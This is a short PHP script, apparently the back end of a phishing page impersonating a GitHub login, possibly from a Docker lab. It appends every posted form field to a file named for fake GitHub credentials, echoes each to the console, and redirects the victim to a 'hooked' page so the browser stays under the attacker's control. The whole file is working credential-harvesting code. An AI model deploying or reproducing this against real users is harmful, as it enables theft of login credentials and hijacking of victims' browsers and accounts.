<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // create file to log POST data
    $handle = fopen("fake-github-credentials.txt", "a");
    
    foreach ($_POST as $variable => $value) {
        $line = $variable . "-" . $value . "\r\n";
        fwrite($handle, $line);

        // print post params to docker console
        error_log($line);
    }
    
    fwrite($handle, "\r\n");
    fclose($handle);

    // Reload so the browser stays hooked
    header("Refresh:0; url=hooked.html");
    exit;
}

?>
